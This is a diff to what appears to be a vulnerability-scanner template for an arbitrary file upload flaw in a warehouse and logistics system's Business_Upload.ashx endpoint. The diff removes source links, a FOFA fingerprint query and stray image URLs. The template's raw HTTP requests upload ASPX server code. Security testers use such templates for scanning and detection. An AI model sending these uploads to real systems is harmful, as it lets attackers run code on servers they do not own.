@@ -3,12 +3,8 @@ info:
   name: 仓储系统和物流管理系统Business_Upload.ashx存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xyd2xsx7h8eu4kms'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xyd2xsx7h8eu4kms
-    fofa: body="/Images/ｆｒａｍｅ/login_title.png"
 http:
 - raw:
   - 'POST /Module_Basic/Customers/Business_Upload.ashx HTTP/1.1
@@ -78,7 +74,7 @@ http:
 
     Response.End();%>
 
-    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350858422-25f5a031-2117-49de-9cd8-1b440e249eca.png)
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360--
 
     上传地址'
   redirects: false
@@ -99,7 +95,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350858837-1b239fc3-193b-4f75-bb1d-677434da8207.png)'
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
   redirects: false
   matchers:
   - status:
